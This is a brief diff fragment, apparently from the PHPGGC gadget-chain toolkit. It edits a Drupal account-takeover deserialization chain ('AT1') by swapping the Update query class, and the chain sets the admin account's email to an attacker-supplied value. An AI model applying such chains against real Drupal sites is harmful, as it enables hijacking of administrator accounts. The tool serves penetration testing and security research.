@@ -15,7 +15,7 @@ class AT1 extends \PHPGGC\GadgetChain\AccountTakeover
     {
         return (
             new \Drupal\views\ViewExecutable(
-                new \Drupal\mysql\Driver\Database\mysql\Update(
+                new \Drupal\Core\Database\Query\Update(
                     [
                         'mail' => $parameters['mail'],
                         'name' => 'admin',
